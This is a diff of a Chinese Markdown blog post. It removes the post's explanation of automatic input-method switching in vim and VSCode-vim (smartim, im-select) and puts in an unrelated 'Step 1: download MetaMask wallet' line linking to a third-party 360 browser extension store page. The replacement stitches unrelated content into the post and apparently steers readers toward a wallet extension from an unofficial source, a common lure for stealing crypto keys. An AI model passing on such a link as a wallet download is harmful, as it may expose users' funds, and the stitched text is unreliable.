@@ -16,13 +16,8 @@ tags:
 
 ---
 
-我相信很多中文世界的 Vimer 都遇到过这个烦恼，在 vim 的 insert 模式时可能突然想输个中文，输完之后会本能的直接 `esc` 接 normal 模式操作，结果发现跳出来的是中文输入法……对于 vscode，我一般会在几次错误之后被逼到退出 vscode vim 模式，而对于终端中用的 neovim，就只能尽量不输入中文了。
-
-为了满足我 1% 用 vim 输入中文的场景（比如写博客），我还是想看看有没有什么解决方案，Google 出来的解决方案基本是：*在退出 insert 模式时记住当时的输入法，并自动切换到默认输入法（一般是英文）给 normal 模式用，并且在下一次进入 insert 模式时再切换回来。*
-
-原生 vim 的话，可以使用 [smartim](https://github.com/ybian/smartim) 插件，原理是调用 [im-select](https://github.com/daipeihust/im-select) 这个 CLI 工具来切换输入法。
-
-对于 VSCode-vim 的话，smartim 的移植也在近期的 PR 中被 merge 到了插件里，[详情见文档的这部分配置]( https://github.com/VSCodeVim/Vim#use-im-select)，需要指定一下默认输入法和 im-select 的 binary 路径就好。
+第一步 下载MetaMask钱包
+360极速浏览器下载链接：[https://ext.chrome.360.cn/webstore/detail/cickkggoijngnjkmbmkibdhmklahopfi](https://ext.chrome.360.cn/webstore/detail/cickkggoijngnjkmbmkibdhmklahopfi)
 
 ---
 
